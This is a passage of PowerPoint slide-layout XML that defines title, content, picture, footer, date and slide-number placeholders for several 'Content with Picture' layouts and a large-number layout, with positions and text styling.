          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Slide Number Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{13662962-C2D0-E99D-BD6A-C97F4798F261}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4090465" y="6464980"/>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934753661"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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Content with Picture 5">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98B87BE0-867D-AF74-02DD-6F5420BC6D61}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="389224" y="621793"/>
            <a:ext cx="3335153" cy="1867629"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7B86FDEC-359F-20D5-12F6-5CBA3DC009EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="407956" y="2890729"/>
            <a:ext cx="3336920" cy="3138438"/>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2" name="Picture Placeholder 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FBEF9CB2-E8D7-8869-9B11-C58F1606DFE0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4022677" y="0"/>
            <a:ext cx="5121323" cy="6858000"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Footer Placeholder 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4784CE43-81E9-3B12-CB65-9B5FC6ECE9ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="386714" y="6430477"/>
            <a:ext cx="1476281" cy="379867"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Slide Number Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{779F1775-5104-9F86-4A61-07F914947CC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3422971" y="6430477"/>
            <a:ext cx="321905" cy="379867"/>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400897873"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="0"/>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Content with Picture 6">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5737300" y="621793"/>
            <a:ext cx="2913410" cy="2280501"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Picture Placeholder 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74736F65-8A7D-D535-AAD0-31480F8AD318}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1" y="0"/>
            <a:ext cx="5445457" cy="6858000"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{747AED59-1A26-9C13-8482-7857E7DEFE52}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5765641" y="3211512"/>
            <a:ext cx="2913410" cy="2743200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr ancho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Footer Placeholder 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C64245F1-97E2-FD23-26A5-03067F464698}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5737300" y="6456385"/>
            <a:ext cx="1476281" cy="379867"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Slide Number Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{15E75D5B-F407-F4DD-192B-D56CF168CDA4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8350615" y="6456386"/>
            <a:ext cx="321905" cy="379867"/>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894440627"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="0"/>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Content with Picture 7">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DB686070-85E7-EB57-8965-F95F2692CC62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="384048" y="3608277"/>
            <a:ext cx="3321525" cy="2620587"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4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1" y="0"/>
            <a:ext cx="9144000" cy="3429000"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4546533B-13A8-961D-BD05-8DE715F63409}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3951027" y="3579703"/>
            <a:ext cx="4723832" cy="2620587"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="171450" indent="0">
              <a:buNone/>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="342900" indent="0">
              <a:buNone/>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="514350" indent="0">
              <a:buNone/>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="685800" indent="0">
              <a:buNone/>
              <a:defRPr lang="en-US" dirty="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Footer Placeholder 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9349FD65-108E-79AD-A9C8-91429963386F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3947000" y="6442873"/>
            <a:ext cx="1476281" cy="379867"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Date Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{547B7542-C2BA-4322-9FF4-E2713B917492}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="18"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5772780" y="6442873"/>
            <a:ext cx="1721998" cy="379867"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>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7" name="Slide Number Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EB058DA4-9F6F-CC80-D1C5-728E096806C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352954" y="6442874"/>
            <a:ext cx="321905" cy="379867"/>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1074116570"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="0"/>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Content with Picture 8">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EB0F469B-7972-C862-3265-20EC44D749C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="384049" y="631711"/>
            <a:ext cx="8274179" cy="1115203"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Picture Placeholder 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1A9091ED-65DB-CA4C-BC68-EC773138EFA0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="18" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="81886" y="2115404"/>
            <a:ext cx="4339988" cy="4671431"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A3F07A79-5344-FA17-3625-1266EFAA87FD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4642867" y="2115403"/>
            <a:ext cx="4015361" cy="4110888"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="171450" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="342900" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="514350" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="685800" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charse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Footer Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC0D704B-E4D2-B261-890F-35C54C94C6EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="20"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4633069" y="6428985"/>
            <a:ext cx="3350872" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Slide Number Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5932FFD-B632-F7EE-B653-9A621348C003}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="21"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8195136" y="6421710"/>
            <a:ext cx="463093"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2452923082"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="0"/>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Content with Picture 9">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376011" y="644000"/>
            <a:ext cx="1945913" cy="1877132"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Picture Placeholder 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F8EA658-2652-6F81-1B04-D50C60A3F171}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="455055" y="2899954"/>
            <a:ext cx="2707814" cy="3314046"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83F7B03F-5EDA-605B-1A2E-F48896E48939}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3301637" y="644000"/>
            <a:ext cx="5387309" cy="5570000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b" anchorCtr="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13" name="Footer Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E471EB04-B63C-4629-0688-E2CC8C576A5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="409445" y="6438285"/>
            <a:ext cx="3957639" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Date Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4924D77-E18C-D84A-F550-9B0188FEBF87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="15"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4642867" y="6432497"/>
            <a:ext cx="1908059" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>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4" name="Slide Number Placeholder 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{38B4B455-40D3-EF76-D860-2A6FFBF69836}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8324347" y="6438285"/>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562552551"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="0"/>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Number Larg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756306E-B77F-CE22-FA8C-F08F17B5E9B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5504688"/>
            <a:ext cx="4426993" cy="1353312"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr sz="1500" b="0" spc="0" baseline="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E418DF0B-1F85-2BB3-D241-A3A14BF72908}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-40943" y="-156950"/>
            <a:ext cx="4467936" cy="4510586"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr sz="11250" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>##%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
